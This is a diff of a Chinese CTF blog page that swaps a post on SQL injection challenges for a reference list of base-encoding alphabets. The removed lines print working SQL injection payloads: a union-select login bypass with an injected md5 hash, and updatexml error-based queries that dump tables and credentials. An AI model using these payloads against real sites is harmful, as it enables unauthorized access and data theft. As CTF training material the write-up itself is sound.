@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SQL注入CTF, Keep-Boom">
+    <meta name="keywords" content="base家族, Keep-Boom">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SQL注入CTF | Keep-Boom</title>
+    <title>base家族 | Keep-Boom</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SQL注入CTF</h1>
+                    <h1 class="description center-align post-title">base家族</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-12-16
+                    2020-12-19
                 </div>
                 
 
@@ -459,63 +459,21 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="GXYCTF2019-BabySQLi1"><a href="#GXYCTF2019-BabySQLi1" class="headerlink" title="[GXYCTF2019]BabySQLi1"></a>[GXYCTF2019]BabySQLi1</h3><p>补充小知识：</p>
-<p>常见的加密方式</p>
-<p>base32  由大写字母和数字或最后面有三个=构成</p>
-<p>base64  由大小写字母和数字或最后面有两个=构成</p>
-<p>md5 加密</p>
-<p>等（作者会了再补充）</p>
-<p>界面</p>
-<p><img src="D:\boke\blog\source\images\8.png"></p>
-<p>①最开始尝试 admin,admin。出现wrong pass！接着尝试a,1。出现wrong user。所以一定存在这admin这个用户。</p>
-<p>②接着尝试注入  ’   注入报错。加注释符#返回正常。</p>
-<p>③结合burpsuite爆破发现过滤了order or 等一些关键字！但没过滤union select 逐个尝试发现有3列。</p>
-<p>之后尝试都是出现not hack me ！用burpsuite拦截看响应包会发现</p>
-<pre><code>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</code></pre>
-<p>由大写字母和数字构成大概率就是base32</p>
-<p>解密后出现</p>
-<p>。。。。。。==</p>
-<p>出现两个= ，明显是base64加密</p>
-<p>解密后出现</p>
-<p>select * from user where username = ‘$name’</p>
-<p>④之后没啥思路看了大佬的博客是说</p>
-<p>程序大概就是</p>
-<p>验证username是否正确，正确了再验证password是否正确，正确才输出。但密码我们不知道怎么办呢？</p>
-<p>⑤知识补充</p>
-<p>如果数据库中不存在某个数据但你 输入</p>
-<pre><code>select * from users where id=1 union select 1,&#39;admin&#39;,&#39;1&#39;;</code></pre>
-<p>会生成临时用户名为admin，密码为1的虚拟数据如：</p>
-<pre><code>+----+----------+----------+
-| id | username | password |
-+----+----------+----------+
-|  1 | Dumb     | Dumb     |
-|  1 | admin    | 1        |
-+----+----------+----------+</code></pre>
-<p>一般数据库里的密码都是经过加密的，所以测试几次会发现这里是用md5进行加密。我们就可以构造语句</p>
-<p>输入密码是123，数据库存的经过md5加密的密码是202cb962ac59075b964b07152d234b70</p>
-<pre><code>name=ad&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#&amp;pw=123</code></pre>
-<p>flag就出来了！</p>
-<h3 id="极客大挑战2019-HardSQL"><a href="#极客大挑战2019-HardSQL" class="headerlink" title="[极客大挑战2019]HardSQL"></a>[极客大挑战2019]HardSQL</h3><p>这关主要是对or,and,空格等都进行了过滤。可以用burpsuite爆破来查询出过滤的关键字。</p>
-<p>①注入点查询，发现是字符型。</p>
-<p>②这里有报错回显所以可以考虑利用报错注入。</p>
-<p>③注出数据库</p>
-<pre><code>0&#39;^updatexml(null,concat(0x3a,(select(database()))),null)#</code></pre>
-<p>注意：这里后台应该是检查到过滤字符就会出现*<u><strong>你可别被我逮住了，臭弟弟</strong></u>*这句话，所以不能有空格的出现！</p>
-<p>④得到数据库为 geek</p>
-<p>注出表名</p>
-<pre><code>0&#39;^updatexml(null,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))),null)#</code></pre>
-<p>注：这里=被过滤，可以用like,in,rlike,regexp来替换</p>
-<p>⑤得到表名为 H4rDsq1</p>
-<p>注出字段名</p>
-<pre><code>0&#39;^updatexml(null,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name)in(&#39;H4rDsq1&#39;))),null)#</code></pre>
-<p>⑥得到字段名为 id,username,password</p>
-<p>注出数据</p>
-<pre><code>0&#39;^updatexml(null,concat(0x3a,(select(group_concat(concat_ws(&#39;~&#39;,id,username,password)))from(H4rDsq1))),null)#</code></pre>
-<p>⑦得到这样的数据</p>
-<pre><code>XPATH syntax error: &#39;:1~flag~flag&#123;7f82b7b1-82d2-4dff-&#39;</code></pre>
-<p>会发现flag只显示了一段怎么办呢？可以利用right函数注出右边部分</p>
-<p>0’^updatexml(null,concat(0x3a,(select(group_concat(right(password,30)))from(H4rDsq1))),null)#</p>
-<p>⑧拼接出完整的flag！</p>
+                <h3 id="base16"><a href="#base16" class="headerlink" title="base16"></a>base16</h3><p>由数字0-9以及大写字母ABCDEF</p>
+<p><u>不过有些题目里是是用小写字母</u></p>
+<h3 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h3><p>由大写字母（A-Z）和数字234567 还有填充符号：=</p>
+<p>base32后面常常带有一个=号</p>
+<h3 id="base58"><a href="#base58" class="headerlink" title="base58"></a>base58</h3><p>由（a-z）和（A-Z）和（1-9）</p>
+<p><u>注：大写字母i 和 o ，小写字母 l ，数字0 没有包括。</u></p>
+<h3 id="base62"><a href="#base62" class="headerlink" title="base62"></a>base62</h3><p>由大写字母（A-Z）、小写字母（a-z）、数字（0-9）</p>
+<h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p>由大写字母（A-Z）、小写字母（a-z）、数字（0-9）以及+，/ 还有填充符号：=</p>
+<p>base64后面常常带有两个=号</p>
+<h3 id="base91"><a href="#base91" class="headerlink" title="base91"></a>base91</h3><p>可打印ASCII字符（0x21-0x7E）</p>
+<p>除以下三个符号外：</p>
+<p>-（破折号，0x2d）</p>
+<p>\（反斜杠，0x5C）</p>
+<p>‘（撇号，0x27）</p>
+<p>Bugku 的贝索斯族这道题目就是base91编码： <u>@iH&lt;,{bdR2H;i6*Tm,Wx2izpx2!</u></p>
 
             </div>
             <hr/>
@@ -541,7 +499,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2020/12/16/SQL%E6%B3%A8%E5%85%A5CTF/">http://example.com/2020/12/16/SQL%E6%B3%A8%E5%85%A5CTF/</a>
+                    <a href="http://example.com/2020/12/19/base%E5%AE%B6%E6%97%8F/">http://example.com/2020/12/19/base%E5%AE%B6%E6%97%8F/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -746,9 +704,48 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2020/12/19/base%E5%AE%B6%E6%97%8F/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="base家族">
+                        
+                        <span class="card-title">base家族</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-19
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Chan.Joy
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2020/12/19/Bugku-Crypto/">
                     <div class="card-image">
@@ -766,45 +763,8 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-12-19
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            Chan.Joy
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/12/12/MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="MySQL基本操作">
-                        
-                        <span class="card-title">MySQL基本操作</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-12
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-19
                             </span>
                         <span class="publish-author">
                             
